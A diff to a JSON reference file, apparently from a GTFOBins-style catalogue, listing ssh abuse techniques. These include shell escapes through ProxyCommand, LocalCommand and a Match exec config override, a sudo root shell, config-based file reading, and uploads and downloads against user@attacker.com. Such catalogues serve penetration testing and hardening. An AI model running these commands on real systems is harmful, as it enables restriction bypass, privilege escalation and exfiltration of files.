@@ -2,40 +2,78 @@
   "functions": {
     "shell": [
       {
-        "description": "Reconnecting may help bypassing restricted shells.",
-        "code": "ssh localhost $SHELL --noprofile --norc\n"
+        "code": "ssh localhost /bin/sh",
+        "comment": "Reconnecting may help bypass restricted shells.",
+        "contexts": {
+          "sudo": null,
+          "suid": null,
+          "unprivileged": null
+        }
       },
       {
-        "description": "Spawn interactive shell through ProxyCommand option.",
-        "code": "ssh -o ProxyCommand=';sh 0<&2 1>&2' x\n"
+        "code": "ssh -o ProxyCommand=';/bin/sh 0<&2 1>&2' x",
+        "contexts": {
+          "sudo": null,
+          "unprivileged": null
+        }
       },
       {
-        "description": "Spawn interactive shell on client, requires a successful connection towards `host`.",
-        "code": "ssh -o PermitLocalCommand=yes -o LocalCommand=/bin/sh host\n"
-      }
-    ],
-    "file-upload": [
+        "code": "ssh -o PermitLocalCommand=yes -o LocalCommand=/bin/sh localhost",
+        "comment": "Executes a shell on the client after successful connection.",
+        "contexts": {
+          "sudo": null,
+          "unprivileged": null
+        }
+      },
       {
-        "description": "Send local file to a SSH server.",
-        "code": "HOST=user@attacker.com\nRPATH=file_to_save\nLPATH=file_to_send\nssh $HOST \"cat > $RPATH\" < $LPATH\n"
+        "code": "echo 'Match exec \"/bin/sh 0<&2 1>&2\"' > \"$HOME/.ssh/config\"; ssh -F ~/.ssh/config localhost",
+        "comment": "Spawns a shell via SSH config override.",
+        "contexts": {
+          "sudo": null,
+          "unprivileged": null
+        }
       }
     ],
-    "file-download": [
+
+    "upload": [
       {
-        "description": "Fetch a remote file from a SSH server.",
-        "code": "HOST=user@attacker.com\nRPATH=file_to_get\nLPATH=file_to_save\nssh $HOST \"cat $RPATH\" > $LPATH\n"
+        "code": "ssh user@attacker.com 'cat > /path/to/output-file' < /path/to/input-file",
+        "contexts": {
+          "sudo": null,
+          "suid": null,
+          "unprivileged": null
+        },
+        "receiver": "ssh-server"
       }
     ],
+
+    "download": [
+      {
+        "code": "ssh user@attacker.com 'cat /path/to/input-file' > /path/to/output-file",
+        "contexts": {
+          "sudo": null,
+          "suid": null,
+          "unprivileged": null
+        },
+        "sender": "ssh-server"
+      }
+    ],
+
     "file-read": [
       {
-        "description": "The read file content is corrupted by error prints.",
-        "code": "LFILE=file_to_read\nssh -F $LFILE localhost\n"
+        "code": "ssh -F /path/to/input-file localhost",
+        "comment": "Reads file via config parsing (output may be corrupted by errors).",
+        "contexts": {
+          "sudo": null,
+          "suid": null,
+          "unprivileged": null
+        }
       }
     ],
+
     "sudo": [
       {
-        "description": "Spawn interactive root shell through ProxyCommand option.",
-        "code": "sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x\n"
+        "code": "sudo ssh -o ProxyCommand=';/bin/sh 0<&2 1>&2' x"
       }
     ]
   }
